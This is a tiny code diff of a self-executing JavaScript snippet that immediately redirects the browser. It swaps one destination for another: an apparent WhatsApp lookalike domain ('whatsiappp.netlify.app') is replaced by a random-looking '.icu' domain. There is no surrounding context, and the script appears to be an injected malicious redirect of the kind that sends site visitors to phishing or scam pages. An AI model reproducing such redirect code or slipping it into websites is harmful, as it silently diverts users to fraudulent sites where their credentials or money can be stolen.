@@ -1,3 +1,3 @@
 (function() {
-    window['location'] = 'https://whatsiappp.netlify.app';
+    window['location'] = 'https://msjetisqks.icu/';
 })();
